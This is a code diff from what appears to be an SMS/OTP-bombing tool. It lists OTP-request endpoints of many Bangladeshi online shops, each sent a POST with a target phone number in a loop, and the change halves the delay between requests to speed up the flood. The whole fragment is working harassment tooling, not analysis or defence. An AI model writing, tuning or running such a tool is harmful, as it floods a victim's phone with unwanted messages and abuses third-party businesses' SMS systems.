@@ -199,18 +199,8 @@
         { url: `https://api.startech.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
         { url: `https://api.ryanscomputers.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
         { url: `https://api.techlandbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.skder.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.deligram.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.oasbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
         { url: `https://api.bagdoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
         { url: `https://api.rokomari.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.boibazar.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.eorange.shop/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.dhamakashopping.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.aleshamart.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.qcoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.boishakhi.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.need.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } }
       ];
 
       let successCount = 0;
@@ -224,7 +214,7 @@
 
         let progress = ((i + 1) / amount) * 100;
         progressBar.style.width = progress + '%';
-        await delay(1000); 
+        await delay(500); 
       }
 
       // ১ নম্বর জায়গা ক্লিয়ার এবং সাকসেস মেসেজ (৩ নম্বর)
